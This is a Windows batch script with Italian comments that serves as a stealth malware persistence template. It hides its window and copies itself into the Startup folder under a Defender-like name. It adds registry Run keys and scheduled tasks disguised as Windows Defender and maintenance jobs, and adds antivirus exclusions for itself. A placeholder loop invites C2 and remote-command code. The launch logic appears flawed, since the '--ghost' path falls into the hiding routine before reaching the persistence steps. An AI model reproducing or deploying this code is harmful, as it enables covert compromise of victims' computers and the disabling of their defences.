@echo off
:: INIZIALIZZAZIONE STEALTH
if not "%1"=="--ghost" (
    :: Nascondi finestra e riavvia in modalità ghost
    call :makeInvisible
    exit
)

:: FUNZIONE PER INVISIBILITÀ COMPLETA
:makeInvisible
echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\~syshelper.vbs"
echo WshShell.Run "%~f0 --ghost", 0, False >> "%TEMP%\~syshelper.vbs"
wscript.exe "%TEMP%\~syshelper.vbs"
del "%TEMP%\~syshelper.vbs" >nul 2>&1
exit /b

:: CONFIGURAZIONE PERSISTENZA
:ghost
setlocal enabledelayedexpansion

:: 1. COPIA IN STARTUP
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat" >nul 2>&1

:: 2. REGISTRO DI AVVIO (3 punti diversi)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemHealth" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1

:: 3. TASK SCHEDULATO (con trigger multipli)
schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "\"%~f0\" --ghost" /sc onstart /delay 0000:30 /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\Maintenance\WinUpdate" /tr "\"%~f0\" --ghost" /sc minute /mo 15 /f >nul 2>&1

:: 4. ESCLUSIONE ANTIVIRUS
powershell -nop -c "Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat'; Add-MpPreference -ExclusionProcess 'wscript.exe'" >nul 2>&1

:: MAIN LOOP INVISIBILE
:mainLoop
:: (Inserisci qui il tuo codice operativo)
:: Esempio: connessione al C2, comandi remoti, ecc.

:: Mantieni il processo attivo in modo stealth
timeout /t 30 >nul
goto mainLoop
